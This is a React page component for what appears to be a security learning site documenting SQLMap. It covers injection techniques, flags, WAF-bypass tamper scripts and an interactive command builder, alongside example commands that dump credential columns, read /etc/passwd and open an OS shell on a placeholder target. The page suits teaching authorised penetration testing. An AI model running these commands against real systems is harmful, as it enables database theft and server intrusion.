import { useState, useEffect } from 'react';
import Layout from '@/components/feature/Layout';
import DocHeading from '@/components/base/DocHeading';
import Callout from '@/components/base/Callout';
import CodeBlock from '@/components/base/CodeBlock';
import InlineCode from '@/components/base/InlineCode';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const injectionTechniques = [
  { code: 'B', name: 'Boolean-based Blind', desc: 'Infers data by asking true/false questions. Slow but works when no output is shown.' },
  { code: 'E', name: 'Error-based', desc: 'Extracts data from database error messages. Fast when errors are visible.' },
  { code: 'U', name: 'UNION-based', desc: 'Uses UNION SELECT to append extra rows to the result. Fastest technique.' },
  { code: 'S', name: 'Stacked Queries', desc: 'Executes multiple SQL statements. Allows INSERT, UPDATE, DELETE operations.' },
  { code: 'T', name: 'Time-based Blind', desc: 'Uses SLEEP() or WAITFOR DELAY to infer data. Works when no output or errors are visible.' },
  { code: 'Q', name: 'Inline Queries', desc: 'Embeds subqueries in the original query. Works in specific scenarios.' },
];

const commonFlags = [
  { flag: '-u <url>', desc: 'Target URL with parameter to test' },
  { flag: '-r <file>', desc: 'Load HTTP request from file (Burp export)' },
  { flag: '-p <param>', desc: 'Specify parameter to test' },
  { flag: '--data <data>', desc: 'POST data string' },
  { flag: '--cookie <cookie>', desc: 'HTTP Cookie header value' },
  { flag: '--headers <headers>', desc: 'Extra HTTP headers' },
  { flag: '--level <1-5>', desc: 'Test level (1=basic, 5=exhaustive)' },
  { flag: '--risk <1-3>', desc: 'Risk level (1=safe, 3=aggressive)' },
  { flag: '--dbms <dbms>', desc: 'Force backend DBMS (mysql, mssql, oracle, etc.)' },
  { flag: '--dbs', desc: 'Enumerate databases' },
  { flag: '--tables', desc: 'Enumerate tables in current database' },
  { flag: '--columns', desc: 'Enumerate columns in a table' },
  { flag: '--dump', desc: 'Dump table data' },
  { flag: '--dump-all', desc: 'Dump all databases' },
  { flag: '-D <db>', desc: 'Specify database name' },
  { flag: '-T <table>', desc: 'Specify table name' },
  { flag: '-C <columns>', desc: 'Specify column names' },
  { flag: '--os-shell', desc: 'Attempt to get an OS shell' },
  { flag: '--os-cmd <cmd>', desc: 'Execute OS command' },
  { flag: '--file-read <path>', desc: 'Read a file from the server' },
  { flag: '--file-write <local>', desc: 'Write a file to the server' },
  { flag: '--tamper <script>', desc: 'Use tamper script to bypass WAF' },
  { flag: '--proxy <url>', desc: 'Route traffic through proxy' },
  { flag: '--tor', desc: 'Use Tor anonymity network' },
  { flag: '--batch', desc: 'Never ask for user input (use defaults)' },
  { flag: '--threads <n>', desc: 'Number of concurrent HTTP requests' },
  { flag: '--random-agent', desc: 'Use random HTTP User-Agent' },
  { flag: '--flush-session', desc: 'Flush session files for target' },
  { flag: '-v <0-6>', desc: 'Verbosity level' },
];

const tamperScripts = [
  { name: 'space2comment', desc: 'Replaces spaces with SQL comments (/**/). Bypasses basic WAFs.' },
  { name: 'between', desc: 'Replaces > with NOT BETWEEN 0 AND. Evades some filters.' },
  { name: 'randomcase', desc: 'Randomizes case of SQL keywords (SeLeCt). Bypasses case-sensitive filters.' },
  { name: 'charencode', desc: 'URL-encodes all characters. Bypasses URL-based filters.' },
  { name: 'base64encode', desc: 'Base64-encodes the payload. For apps that decode base64 input.' },
  { name: 'apostrophemask', desc: 'Replaces apostrophes with UTF-8 full-width equivalent.' },
  { name: 'equaltolike', desc: 'Replaces = with LIKE operator.' },
  { name: 'modsecurityversioned', desc: 'Wraps queries in versioned comments for MySQL.' },
];

const examples = [
  { title: 'Basic GET parameter test', cmd: "sqlmap -u 'http://target.com/page?id=1'" },
  { title: 'POST data injection', cmd: "sqlmap -u 'http://target.com/login' --data='user=admin&pass=test'" },
  { title: 'Load request from Burp file', cmd: "sqlmap -r request.txt" },
  { title: 'Enumerate all databases', cmd: "sqlmap -u 'http://target.com/page?id=1' --dbs" },
  { title: 'Enumerate tables in a database', cmd: "sqlmap -u 'http://target.com/page?id=1' -D mydb --tables" },
  { title: 'Dump a specific table', cmd: "sqlmap -u 'http://target.com/page?id=1' -D mydb -T users --dump" },
  { title: 'Dump specific columns', cmd: "sqlmap -u 'http://target.com/page?id=1' -D mydb -T users -C username,password --dump" },
  { title: 'Use tamper script to bypass WAF', cmd: "sqlmap -u 'http://target.com/page?id=1' --tamper=space2comment" },
  { title: 'Get OS shell (if privileged)', cmd: "sqlmap -u 'http://target.com/page?id=1' --os-shell" },
  { title: 'Read server file', cmd: "sqlmap -u 'http://target.com/page?id=1' --file-read=/etc/passwd" },
  { title: 'Use Tor for anonymity', cmd: "sqlmap -u 'http://target.com/page?id=1' --tor --tor-type=SOCKS5" },
  { title: 'High level + risk with random agent', cmd: "sqlmap -u 'http://target.com/page?id=1' --level=5 --risk=3 --random-agent --batch" },
];

export default function SQLMapPage() {
  const [activeTab, setActiveTab] = useState<string | null>(null);
  const [builderUrl, setBuilderUrl] = useState('http://target.com/page?id=1');
  const [builderMethod, setBuilderMethod] = useState('GET');
  const [builderData, setBuilderData] = useState('');
  const [builderParam, setBuilderParam] = useState('');
  const [builderLevel, setBuilderLevel] = useState('1');
  const [builderRisk, setBuilderRisk] = useState('1');
  const [builderDbms, setBuilderDbms] = useState('');
  const [builderAction, setBuilderAction] = useState('--dbs');
  const [builderDb, setBuilderDb] = useState('');
  const [builderTable, setBuilderTable] = useState('');
  const [builderTamper, setBuilderTamper] = useState('');
  const [builderFlags, setBuilderFlags] = useState<string[]>(['--batch']);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const toggleFlag = (flag: string) => {
    setBuilderFlags((prev) =>
      prev.includes(flag) ? prev.filter((f) => f !== flag) : [...prev, flag]
    );
  };

  const getGeneratedCommand = () => {
    let cmd = 'sqlmap';
    cmd += ` -u '${builderUrl}'`;
    if (builderMethod === 'POST' && builderData) cmd += ` --data='${builderData}'`;
    if (builderParam) cmd += ` -p ${builderParam}`;
    if (builderLevel !== '1') cmd += ` --level=${builderLevel}`;
    if (builderRisk !== '1') cmd += ` --risk=${builderRisk}`;
    if (builderDbms) cmd += ` --dbms=${builderDbms}`;
    if (builderTamper) cmd += ` --tamper=${builderTamper}`;
    if (builderDb) cmd += ` -D ${builderDb}`;
    if (builderTable) cmd += ` -T ${builderTable}`;
    cmd += ` ${builderAction}`;
    builderFlags.forEach((f) => { cmd += ` ${f}`; });
    return cmd;
  };

  const copyCmd = () => {
    navigator.clipboard.writeText(getGeneratedCommand());
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Layout>
      <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
        {/* Header */}
        <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
          <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
            <i className="ri-database-2-line" />
            SQL Injection Tool
          </div>
          <DocHeading level={1}>SQLMap</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            <strong className="text-white">SQLMap</strong> is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities.
            It supports a wide range of database management systems including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, and more.
            SQLMap can extract data, read/write files, and even execute OS commands on vulnerable systems.
          </p>
        </motion.div>

        <Callout type="danger" className="mt-6">
          SQLMap is a powerful offensive tool. Only use it against systems you own or have explicit written permission to test. Unauthorized use is illegal.
        </Callout>

        {/* Overview */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="overview">What is SQLMap</DocHeading>
          <div className="mt-4 grid grid-cols-1 sm:grid-cols-2 gap-3">
            {[
              'Automatic SQLi detection and exploitation',
              'Supports 6 injection techniques',
              'Database fingerprinting',
              'Data extraction and dumping',
              'File read/write on server',
              'OS command execution',
              'WAF/IDS evasion with tamper scripts',
              'Tor and proxy support',
            ].map((item, i) => (
              <div key={i} className="flex items-center gap-2.5 text-sm text-cyber-text-muted">
                <span className="w-1.5 h-1.5 rounded-full bg-cyber-red flex-shrink-0" />
                {item}
              </div>
            ))}
          </div>
        </motion.section>

        {/* Installation */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="installation">Installation</DocHeading>
          <div className="mt-4 space-y-4">
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">Kali Linux (pre-installed)</h4>
              <CodeBlock code="sqlmap --version" />
            </div>
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">Linux / macOS (pip)</h4>
              <CodeBlock code="pip install sqlmap" />
            </div>
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">From Source</h4>
              <CodeBlock code={"git clone https://github.com/sqlmapproject/sqlmap.git\ncd sqlmap\npython3 sqlmap.py --version"} />
            </div>
          </div>
        </motion.section>

        {/* Injection Techniques */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="techniques">Injection Techniques</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            SQLMap supports six injection techniques. Use <InlineCode>--technique=BEUSTQ</InlineCode> to specify which ones to try.
          </p>
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3">
            {injectionTechniques.map((t) => (
              <button
                key={t.code}
                type="button"
                onClick={() => setActiveTab(activeTab === t.code ? null : t.code)}
                className={`cyber-card p-4 text-left cursor-pointer ${activeTab === t.code ? 'border-cyber-red' : ''}`}
              >
                <div className="flex items-start gap-3">
                  <span className="w-8 h-8 rounded-lg bg-cyber-red/10 border border-cyber-red/20 text-cyber-red font-bold text-sm flex items-center justify-center flex-shrink-0">
                    {t.code}
                  </span>
                  <div>
                    <h4 className="text-sm font-semibold text-white">{t.name}</h4>
                    <p className="text-xs text-cyber-text-muted mt-1">{t.desc}</p>
                  </div>
                </div>
              </button>
            ))}
          </div>
          <div className="mt-4">
            <h4 className="text-sm font-semibold text-white mb-2">Specify techniques</h4>
            <CodeBlock code="sqlmap -u 'http://target.com/page?id=1' --technique=BEUST" />
          </div>
        </motion.section>

        {/* Common Flags */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="flags">Common Flags Reference</DocHeading>
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-2">
            {commonFlags.map((f) => (
              <div key={f.flag} className="flex items-start gap-3 p-3 rounded-lg bg-cyber-bg-card/50 border border-cyber-border">
                <span className="font-mono text-xs px-2 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan flex-shrink-0 whitespace-nowrap">{f.flag}</span>
                <span className="text-sm text-cyber-text-muted">{f.desc}</span>
              </div>
            ))}
          </div>
        </motion.section>

        {/* Tamper Scripts */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="tamper">Tamper Scripts (WAF Bypass)</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            Tamper scripts modify payloads to bypass Web Application Firewalls (WAFs) and input filters.
          </p>
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3">
            {tamperScripts.map((t) => (
              <div key={t.name} className="cyber-card p-4">
                <span className="font-mono text-xs px-2 py-0.5 rounded bg-cyber-bg border border-cyber-border text-cyber-amber">{t.name}</span>
                <p className="text-xs text-cyber-text-muted mt-2">{t.desc}</p>
              </div>
            ))}
          </div>
          <div className="mt-4">
            <h4 className="text-sm font-semibold text-white mb-2">Chain multiple tamper scripts</h4>
            <CodeBlock code="sqlmap -u 'http://target.com/page?id=1' --tamper=space2comment,randomcase,charencode" />
          </div>
        </motion.section>

        {/* Examples */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="examples">Usage Examples</DocHeading>
          <div className="mt-4 space-y-4">
            {examples.map((ex, i) => (
              <div key={i}>
                <h4 className="text-sm font-semibold text-white mb-2">{ex.title}</h4>
                <CodeBlock code={ex.cmd} />
              </div>
            ))}
          </div>
        </motion.section>

        {/* Interactive Command Builder */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="builder">Interactive Command Builder</DocHeading>
          <div className="mt-5 cyber-card p-5 md:p-6">
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">Target URL</label>
              <input type="text" value={builderUrl} onChange={(e) => setBuilderUrl(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                placeholder="http://target.com/page?id=1" />
            </div>
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">Method</label>
              <div className="flex gap-2">
                {['GET', 'POST'].map((m) => (
                  <button key={m} type="button" onClick={() => setBuilderMethod(m)}
                    className={`px-4 py-2 rounded-lg text-xs font-mono border transition-all whitespace-nowrap ${builderMethod === m ? 'bg-cyber-red/10 border-cyber-red text-cyber-red' : 'bg-cyber-bg border-cyber-border text-cyber-text-muted hover:border-cyber-red/50'}`}>
                    {m}
                  </button>
                ))}
              </div>
            </div>
            {builderMethod === 'POST' && (
              <div className="mb-4">
                <label className="text-sm font-semibold text-white block mb-2">POST Data</label>
                <input type="text" value={builderData} onChange={(e) => setBuilderData(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                  placeholder="user=admin&pass=test" />
              </div>
            )}
            <div className="grid grid-cols-2 gap-4 mb-4">
              <div>
                <label className="text-sm font-semibold text-white block mb-2">Level (1-5)</label>
                <select value={builderLevel} onChange={(e) => setBuilderLevel(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text focus:outline-none focus:border-cyber-red">
                  {['1','2','3','4','5'].map((l) => <option key={l} value={l}>{l}</option>)}
                </select>
              </div>
              <div>
                <label className="text-sm font-semibold text-white block mb-2">Risk (1-3)</label>
                <select value={builderRisk} onChange={(e) => setBuilderRisk(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text focus:outline-none focus:border-cyber-red">
                  {['1','2','3'].map((r) => <option key={r} value={r}>{r}</option>)}
                </select>
              </div>
            </div>
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">DBMS (optional)</label>
              <select value={builderDbms} onChange={(e) => setBuilderDbms(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text focus:outline-none focus:border-cyber-red">
                <option value="">Auto-detect</option>
                <option value="mysql">MySQL</option>
                <option value="mssql">MSSQL</option>
                <option value="oracle">Oracle</option>
                <option value="postgresql">PostgreSQL</option>
                <option value="sqlite">SQLite</option>
              </select>
            </div>
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">Action</label>
              <div className="flex flex-wrap gap-2">
                {['--dbs', '--tables', '--columns', '--dump', '--os-shell'].map((a) => (
                  <button key={a} type="button" onClick={() => setBuilderAction(a)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all whitespace-nowrap ${builderAction === a ? 'bg-cyber-red/10 border-cyber-red text-cyber-red' : 'bg-cyber-bg border-cyber-border text-cyber-text-muted hover:border-cyber-red/50'}`}>
                    {a}
                  </button>
                ))}
              </div>
            </div>
            {(builderAction === '--tables' || builderAction === '--columns' || builderAction === '--dump') && (
              <div className="mb-4">
                <label className="text-sm font-semibold text-white block mb-2">Database (-D)</label>
                <input type="text" value={builderDb} onChange={(e) => setBuilderDb(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                  placeholder="mydb" />
              </div>
            )}
            {(builderAction === '--columns' || builderAction === '--dump') && (
              <div className="mb-4">
                <label className="text-sm font-semibold text-white block mb-2">Table (-T)</label>
                <input type="text" value={builderTable} onChange={(e) => setBuilderTable(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                  placeholder="users" />
              </div>
            )}
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">Tamper Script (optional)</label>
              <select value={builderTamper} onChange={(e) => setBuilderTamper(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text focus:outline-none focus:border-cyber-red">
                <option value="">None</option>
                {tamperScripts.map((t) => <option key={t.name} value={t.name}>{t.name}</option>)}
              </select>
            </div>
            <div className="mb-5">
              <label className="text-sm font-semibold text-white block mb-2">Extra Flags</label>
              <div className="flex flex-wrap gap-2">
                {['--batch', '--random-agent', '--tor', '--flush-session', '-v 3'].map((f) => (
                  <button key={f} type="button" onClick={() => toggleFlag(f)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all whitespace-nowrap ${builderFlags.includes(f) ? 'bg-cyber-red/10 border-cyber-red text-cyber-red' : 'bg-cyber-bg border-cyber-border text-cyber-text-muted hover:border-cyber-red/50'}`}>
                    {f}
                  </button>
                ))}
              </div>
            </div>
            <div className="bg-cyber-bg border border-cyber-border rounded-lg p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-semibold text-cyber-red">Generated Command</span>
                <button type="button" onClick={copyCmd} className="text-xs text-cyber-cyan hover:text-cyber-cyan-dim transition-colors flex items-center gap-1">
                  <i className={copied ? 'ri-check-line' : 'ri-file-copy-line'} />
                  {copied ? 'Copied!' : 'Copy'}
                </button>
              </div>
              <code className="text-sm font-mono text-cyber-green break-all">{getGeneratedCommand()}</code>
            </div>
          </div>
        </motion.section>

        {/* Tips */}
        <motion.section className="mt-10 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="tips">Pro Tips</DocHeading>
          <div className="mt-4 space-y-3">
            <Callout type="tip">Export requests from Burp Suite and use <InlineCode>sqlmap -r request.txt</InlineCode> to test them — much easier than manually crafting URLs.</Callout>
            <Callout type="info">Start with <InlineCode>--level=1 --risk=1</InlineCode> and increase only if needed. Higher levels send more requests and may cause damage.</Callout>
            <Callout type="tip">Use <InlineCode>--batch</InlineCode> to run non-interactively and accept all defaults — great for scripting.</Callout>
            <Callout type="warning">The <InlineCode>--os-shell</InlineCode> and <InlineCode>--file-write</InlineCode> options can cause serious damage to the target system. Use with extreme caution.</Callout>
          </div>
        </motion.section>
      </div>
    </Layout>
  );
}
